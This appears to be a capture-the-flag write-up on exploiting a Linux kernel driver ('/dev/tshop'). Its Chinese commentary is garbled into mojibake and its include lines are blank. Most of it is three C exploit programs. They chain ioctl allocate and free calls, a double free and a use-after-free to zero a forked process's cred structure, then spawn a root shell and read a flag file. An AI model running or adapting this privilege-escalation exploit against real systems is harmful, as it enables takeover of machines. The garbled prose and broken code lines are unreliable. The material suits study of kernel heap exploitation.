    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    void debug(){
        getchar();
    }
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
        pid=fork();
        if(pid==0){
            printf("[+] root?");
            system("whoami");
        }else{
                ioctl(fd,MALLOC,16);
                ioctl(fd,MALLOC,17);//cred==0 
                ioctl(fd,FREE,0);
                ioctl(fd,FREE,1);
                ioctl(fd,FREE,2);
                ioctl(fd,FREE,3);
                ioctl(fd,FREE,4);
                ioctl(fd,FREE,5);
                ioctl(fd,FREE,6);
                ioctl(fd,FREE,7);
                ioctl(fd,FREE,8);
                ioctl(fd,FREE,9);
                ioctl(fd,FREE,10);
                ioctl(fd,FREE,11);
                ioctl(fd,FREE,12);
                ioctl(fd,FREE,13);
                ioctl(fd,FREE,14);
                ioctl(fd,FREE,15);
        }
    }
è¾“å‡ºç»“æœï¼š
è²Œä¼¼å·²ç»ææƒæˆåŠŸäº†ã€‚è¿™ç§æ–¹æ³•ç¡®å®å¥æ•ˆï¼Œä½†æ˜¯å½“æˆ‘å¤šæ‰§è¡Œä¸€äº›æŒ‡ä»¤çš„æ—¶å€™å†…æ ¸åˆä¼španic ğŸ™
æ€ä¹ˆåŠå‘¢ï¼Ÿ
## Exploit åŠ å›º
ç”±äºpanicçš„æ ¸å¿ƒåŸå› åœ¨äºæŠŠ cred info å½“ä½œåœ°å€æ¥ç”³è¯·å †å—ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªæ–¹å‘æ€è€ƒçš„è¯ï¼Œå…¶å®å¯ä»¥é€šè¿‡ä¸€ä¸ªfreeçš„å†™æŒ‡é’ˆæ“ä½œæŠŠ cred info
è¦†ç›–ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„ chunk åœ°å€ï¼Œä¹Ÿå°±æ˜¯freeé“¾è¡¨çš„å°¾ chunk åœ°å€ã€‚
    /*
     * main.c
     * Copyright (C) 2019 P1umer 
     */
    // gcc exp.c -o exp --static -lpthread
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MALLOC 0x271A
    #define FREE   0x2766
    #define EDIT1  0x1A0A
    #define EDIT2  0x22B8 
    pid_t pid;
    void debug(){
        getchar();
    }
    int main(int argc, char *argv[]){
        int fd = open("/dev/tshop",0);
        debug();
        ioctl(fd,MALLOC,0);
        ioctl(fd,MALLOC,1);
        ioctl(fd,MALLOC,2);
        ioctl(fd,MALLOC,3);
        ioctl(fd,MALLOC,4);
        ioctl(fd,MALLOC,5);
        ioctl(fd,MALLOC,6);
        ioctl(fd,MALLOC,7);
        ioctl(fd,MALLOC,8);
        ioctl(fd,MALLOC,9);
        ioctl(fd,MALLOC,10);
        ioctl(fd,MALLOC,11);
        ioctl(fd,MALLOC,12);
        ioctl(fd,MALLOC,13);
        ioctl(fd,MALLOC,14);
        ioctl(fd,MALLOC,15);
        ioctl(fd,MALLOC,16);
        ioctl(fd,MALLOC,17);
        ioctl(fd,FREE,17);
        ioctl(fd,FREE,16);
        ioctl(fd,FREE,17);
        pid=fork();
        if(pid==0){
            sleep(1);
            printf("[+] root");
            system("whoami");
            system("/bin/sh");
        }else{
            printf("[+] shell close");
            ioctl(fd,FREE,17);
            ioctl(fd,MALLOC,17);
            ioctl(fd,MALLOC,16);
            ioctl(fd,MALLOC,17);//cred==0 
            ioctl(fd,FREE,0);
            ioctl(fd,FREE,1);
            ioctl(fd,FREE,2);
            ioctl(fd,FREE,3);
            ioctl(fd,FREE,4);
            ioctl(fd,FREE,5);
            ioctl(fd,FREE,6);
            ioctl(fd,FREE,7);
            ioctl(fd,FREE,8);
            ioctl(fd,FREE,9);
            ioctl(fd,FREE,10);
            ioctl(fd,FREE,11);
            ioctl(fd,FREE,12);
            ioctl(fd,FREE,13);
            ioctl(fd,FREE,14);
            ioctl(fd,FREE,15);
            sleep(100);
        }
    }
ä¸»è¿›ç¨‹é€šè¿‡ UAF å†æ¬¡æŠŠ chunk17 free äº†ä¸€æ¬¡ï¼Œå¤å†™é‡Œé¢çš„Cred info ä¸º chunk16
çš„åœ°å€ï¼Œç„¶åå†æ¬¡ç”³è¯·å †å—æŠŠé“¾è¡¨æ¢å¤ä¸ºåŸçŠ¶æ€ã€‚åŒæ—¶åœ¨çˆ¶è¿›ç¨‹ä¸­åŠ äº†sleepå‡½æ•°æé«˜ç¨³å®šæ€§ã€‚
è¿™æ—¶å€™å·²ç»å¾—åˆ°äº†ç¨³å®šçš„ root shell ğŸ™‚
## æ›´å¤šçš„æ€è€ƒ
è¿˜æœ‰ä¸€ç§æ›´ä¸ºç²¾ç®€çš„è§£æ³•, ä»ä¸€å¼€å§‹æ²¡æœ‰è€ƒè™‘ doublefree ï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define DEL         0x2766
    #define SET_ZEGE     0x22B8  // 0x123456789ABCDEF0LL
    #define ALLOC         0x271A
    #define SET_JIGE     0x1A0A  // 0xFEDCBA987654321LL
    int main() {
        int fd = open("/dev/tshop", 0);
        size_t heap_addr , kernel_addr,mod_addr;
        if (fd < 0) {
            printf("[-] bad open /dev/tshopn");
            exit(-1);
        }
        ioctl(fd, ALLOC, 0);
        ioctl(fd, ALLOC, 1);
        ioctl(fd, DEL, 0);
        ioctl(fd, DEL, 1);
        int pid=fork();
        ioctl(fd, DEL, 1);
        ioctl(fd, ALLOC, 3);
        //getchar();
        //getchar();
        if (pid < 0) {
            puts("[-] fork error!");
            exit(0);
        } else if (pid == 0) {
            if (getuid() == 0) {
                puts("[+] root");
                system("cat /home/sunichi/flag");
                system("id");
                system("/bin/sh")
                exit(0);
            }
        } else {
            sleep(30);
            puts("[+] parent exit");
        }
    }
å…·ä½“æ€è·¯ï¼š
  * allocå¹¶freeæ‰ä¸¤å—å†…å­˜ï¼Œä½¿ä»–ä»¬æ¥å…¥slab cacheé“¾è¡¨çš„å°¾éƒ¨ï¼Œè¿™é‡Œæš‚ä¸”ç»™å®ƒç¼–å·ä¸ºchunk0å’Œchunk1
  * ç”±äºé‡‡ç”¨FIFOç®—æ³•ï¼Œæ­¤æ—¶slabç¼“å­˜çš„å•å‘é“¾è¡¨æœ€å°¾ç«¯çš„chunkä¸ºchunk1ï¼Œè€Œä¸”ç¬¬ä¸€ä¸ª8å­—èŠ‚å­˜å‚¨çš„æ˜¯æŒ‡å‘chunk0çš„æŒ‡é’ˆï¼Œå½“ALLOCæ–°cacheæ—¶ï¼Œå°†ä¼˜å…ˆå–å‡ºchunk1åˆ†é…ç»™è¿›ç¨‹ã€‚
  * forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹çš„credç»“æ„ä½“ä¼šå¤ç”¨æ­¤å‰æˆ‘ä»¬freeæ‰çš„å†…å­˜å—ï¼ˆchunk1ï¼‰  
æ­¤æ—¶ï¼Œå †å—ä¸­çš„credå¦‚ä¸‹ï¼š  
  * æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°†credçš„idä½ç½®é›¶ï¼Œé¦–å…ˆå°±éœ€è¦å†æ¬¡æ‹¿åˆ°credæ‰€åœ¨å †å—ï¼ˆchunk1ï¼‰
  * freeå¹¶ç«‹å³è¿›è¡Œallocæ“ä½œï¼Œchunk1å°±ä¼šæŒ‚åˆ°cacheé“¾ä¸Šåå†æ¬¡è¢«ç”³è¯·å›æ¥ã€‚
  * ç”±äºALLOCæ“ä½œä¼´éšç€æ‰€åœ¨å †å—æ•°æ®çš„åˆå§‹åŒ–ï¼Œäºæ˜¯æˆ‘ä»¬ä¸ç”¨å†æœ‰å¤šä½™çš„æ“ä½œä¾¿èƒ½å°†credç»“æ„ä½“uidåŠgidä½ç½®é›¶ã€‚æ­¤æ—¶å­è¿›ç¨‹å°±å·²æˆåŠŸææƒï¼ˆrootï¼‰